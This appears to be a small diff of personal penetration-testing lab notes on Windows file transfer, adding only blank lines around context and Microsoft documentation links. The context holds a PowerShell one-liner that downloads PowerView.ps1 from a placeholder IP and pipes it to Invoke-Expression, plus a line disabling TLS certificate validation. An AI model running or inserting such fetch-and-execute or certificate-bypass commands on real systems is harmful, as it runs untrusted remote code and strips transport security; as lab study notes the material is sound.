@@ -34,6 +34,9 @@ PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX  
 PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}      绕过证书不被信任
 
 
+
+
+
 Windows download:
   https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0
   https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.6&viewFallbackFrom=powershell-7.2
